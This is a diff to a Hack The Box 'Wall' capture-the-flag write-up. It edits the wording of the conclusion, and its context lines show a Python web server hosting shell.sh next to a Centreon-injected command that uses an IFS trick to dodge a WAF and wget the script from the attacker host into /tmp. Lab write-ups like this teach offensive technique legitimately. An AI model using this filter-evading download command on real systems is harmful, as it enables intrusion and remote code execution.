@@ -413,7 +413,7 @@ and lets get that served up on our webserver:
 root@endeavour:~/htb/wall# python -m SimpleHTTPServer 8080
 Serving HTTP on 0.0.0.0 port 8080 ...
 ```
-and then we drop the below command into the centreon GUI, give it execution rights, and then execute it
+and then we drop the below command into the centreon GUI, give it execution rights, and then execute it:
 
 ```console
 IFS=];b=wget]10.10.14.75:8080/htb/wall/shell.sh]-P]/tmp;$b
@@ -569,7 +569,5 @@ fe619********************a8406
 Excellent, we went backwards with the flags (maybe?) but glad this box is finally over.
 
 # Conclusion
-In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.
-
-# References
+This box was pretty okay, I felt getting around the WAF step to be a little bit of an exercise in frustration but I really enojyed applying techniques that I have used or seen used professionally to a box. This was the first machine I've been able to do that on.
 
